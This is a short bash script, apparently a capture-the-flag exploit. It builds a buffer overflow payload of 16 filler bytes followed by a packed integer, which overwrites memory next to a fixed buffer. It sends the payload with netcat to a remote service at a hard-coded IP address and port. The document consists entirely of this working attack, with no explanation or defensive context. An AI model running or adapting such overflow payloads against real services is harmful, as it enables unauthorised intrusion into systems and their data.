#!/bin/bash

python -c "import struct; out = 'A'*0x10; out += struct.pack('I', 0x1); print(out)" | nc 34.75.105.136 1024
